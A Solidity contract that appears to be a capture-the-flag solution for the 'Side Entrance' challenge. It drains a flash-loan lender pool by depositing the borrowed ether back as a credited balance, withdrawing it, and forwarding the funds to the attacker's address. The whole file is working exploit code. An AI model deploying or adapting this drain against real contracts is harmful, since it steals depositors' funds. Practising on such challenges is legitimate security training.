// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract ExploitSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    function exploit(uint256 amount) external {
        /* get the flashloan which deposits back into the contract */
        pool.flashLoan(amount);
        /* wthdraw */
        pool.withdraw();
    }

    function execute() external payable {
        /* so the flashloan deposits */
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        /* send money back to attacker wallet */
        owner.transfer(address(this).balance);
    }
}
